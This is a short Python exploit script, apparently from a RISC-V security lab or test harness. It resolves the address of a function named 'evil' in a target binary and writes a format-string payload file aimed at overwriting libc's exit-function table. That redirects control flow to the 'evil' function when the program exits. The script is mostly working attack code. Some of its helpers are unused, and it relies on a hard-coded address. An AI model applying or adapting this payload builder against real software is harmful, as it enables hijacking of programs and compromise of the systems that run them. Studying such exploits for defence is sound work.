#!/usr/bin/env python3
import os
import sys
import subprocess as sp
from fsb import *

ROOT = os.path.dirname(__file__)
BIN_DIR = "%s/../../install/bin/" % ROOT
CROSS_COMPILE = "riscv64-unknown-linux-gnu-"
OBJDUMP = "%s/%sobjdump" % (BIN_DIR, CROSS_COMPILE)
GCC = "%s/%sgcc" % (BIN_DIR, CROSS_COMPILE)

def skip(n, p):
    for i in range(n):
        p.stdout.readline()

def sh(cmds):
    assert(os.spawnvp(os.P_WAIT, cmds[0], cmds) == 0)

def get_meta(prog):
    # get distance and address of got
    p = sp.Popen([OBJDUMP, "-D", "libc.so.6"], stdout=sp.PIPE)

    for line in p.stdout:
        line = line.strip().decode("utf-8")
        if line.endswith(" <__exit_funcs>"):
            break;
    line = line.split('#')[1].strip().split(' ')[0]
    return int(line, 16)


def build(exit_funcs, src, prog):
    cflags = "-O0"

    cmds = []
    cmds.append(GCC)
    cmds.append("-DEXIT_FUNCS=%du" % exit_funcs)
    cmds += ["-O0", "-o", prog, src]
    sh(cmds)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("usage : %s prog" % sys.argv[0])
        sys.exit(-1)

    prog = sys.argv[1]

    # XXX: use fixed..
    addr = 0x200016acf0
    evil = nm(prog, "evil")
    print("ADDR : %016X" % addr)
    print("EVIL : %016X" % evil)

    f = open('payload', 'wb')
    f.write(build_payload(addr, evil))
    f.write(b"exit")
    f.close()
